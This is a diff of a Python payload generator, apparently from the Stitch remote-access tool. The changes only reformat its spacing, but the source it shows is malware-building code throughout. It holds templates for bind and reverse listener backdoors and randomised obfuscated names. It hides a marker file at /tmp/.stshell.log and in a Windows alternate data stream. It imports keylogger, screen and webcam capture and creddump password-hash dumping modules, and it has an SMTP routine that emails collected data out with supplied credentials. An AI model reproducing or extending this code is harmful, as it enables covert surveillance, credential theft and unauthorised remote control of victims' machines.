@@ -3,12 +3,12 @@
 
 import sys
 from st_aes import *
-from random import randint,choice
+from random import randint, choice
 from string import ascii_uppercase
 
 st_obf = []
-for n in range(0,10):
-    st_obf.append(''.join(choice(ascii_uppercase) for i in range(randint(1,5))))
+for n in range(0, 10):
+    st_obf.append(''.join(choice(ascii_uppercase) for i in range(randint(1, 5))))
 
 ################################################################################
 #                       st_main.py stitch_gen variables                        #
@@ -22,7 +22,8 @@ class stitch_payload():
     connected = False
 '''
 
-def add_bind_server(BHOST,BPORT):
+
+def add_bind_server(BHOST, BPORT):
     return '''
     def bind_server(self):
         client_socket=None
@@ -61,9 +62,10 @@ def add_bind_server(BHOST,BPORT):
         server.close()
 
     def halt_bind_server(self):
-        self.stop_bind_server = True\n\n'''.format(BHOST,BPORT)
+        self.stop_bind_server = True\n\n'''.format(BHOST, BPORT)
 
-def add_listen_server(LHOST,LPORT):
+
+def add_listen_server(LHOST, LPORT):
     return '''
     def listen_server(self):
         self.stop_listen_server  = False
@@ -96,10 +98,11 @@ def add_listen_server(LHOST,LPORT):
                 client_socket.close()
 
     def halt_listen_server(self):
-        self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)
+        self.stop_listen_server = True\n\n'''.format(LHOST, LPORT)
+
 
 def add_listen_bind_main():
-    return'''
+    return '''
 def main():
     if not stitch_running():
         st_pyld = stitch_payload()
@@ -122,6 +125,7 @@ def main():
         st_pyld.halt_listen_server()
 
 '''
+
 
 def add_listen_main():
     return '''
@@ -144,6 +148,7 @@ def main():
 
 '''
 
+
 def add_bind_main():
     return '''
 def main():
@@ -164,6 +169,7 @@ def main():
         st_pyld.halt_bind_server()
 
 '''
+
 
 def add_run_main():
     if sys.platform.startswith('darwin'):
@@ -188,6 +194,8 @@ if __name__ == '__main__':
 if __name__ == '__main__':
     main()
 '''
+
+
 ################################################################################
 #                       st_utils.py stitch_gen variables                       #
 ################################################################################
@@ -397,8 +405,9 @@ def client_handler({2}):
 dbg = False
 nt_kl = keylogger()
 script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))\n
-'''.format(st_obf[0],st_obf[1],st_obf[2],st_obf[3],st_obf[4],st_obf[5],st_obf[6],
-            st_obf[7],st_obf[8],st_obf[9])
+'''.format(st_obf[0], st_obf[1], st_obf[2], st_obf[3], st_obf[4], st_obf[5], st_obf[6],
+           st_obf[7], st_obf[8], st_obf[9])
+
 
 # windows st_running = 'C:\\Windows\\Temp:stshell.log'
 # posix st_running = '/tmp/.stshell.log'
@@ -417,6 +426,7 @@ def reg_exists(path):
         return False\n\n
 '''
 
+
 def win_util_imports():
     return '''
 import vidcap
@@ -431,6 +441,7 @@ from PIL import Image, ImageFile
 from creddump.hashdump import dump_file_hashes
 '''
 
+
 def osx_util_imports():
     return '''
 import pexpect
@@ -443,6 +454,7 @@ from Cocoa import NSEvent, NSKeyDownMask
 from AppKit import NSApplication, NSApp, NSWorkspace\n\n
 '''
 
+
 def lnx_util_imports():
     return '''
 import pexpect
@@ -451,6 +463,7 @@ import pexpect.pxssh
 from mss.linux import MSS
 from st_lnx_keylogger import *\n
 '''
+
 
 ################################################################################
 #                       st_encryption.py stitch_gen variables                  #
@@ -475,7 +488,8 @@ def decrypt(enc):
     iv = enc[:16]
     cipher = AES.new({0}, AES.MODE_CFB, iv )
     return cipher.decrypt( enc[16:] )
-'''.format(st_obf[0],aes_encoded,aes_abbrev)
+'''.format(st_obf[0], aes_encoded, aes_abbrev)
+
 
 ################################################################################
 #                       st_protocol.py stitch_gen variables                    #
@@ -530,6 +544,7 @@ def receive(sock,silent=False,timeout=True):
             break
     return full_response
 '''
+
 
 ################################################################################
 #                       st_win_keylogger.py stitch_gen variables               #
@@ -924,7 +939,8 @@ from email.mime.text import MIMEText
 from email import Encoders
 '''
 
-def get_email(user,pwd):
+
+def get_email(user, pwd):
     return '''
 import smtplib
 from email.mime.multipart import MIMEMultipart
@@ -1019,7 +1035,8 @@ except Exception as e:
         s.write(str(e))
     pass
 
-'''.format(user,pwd)
+'''.format(user, pwd)
+
 
 ################################################################################
 #                       st_requirments.py stitch_gen variables                 #
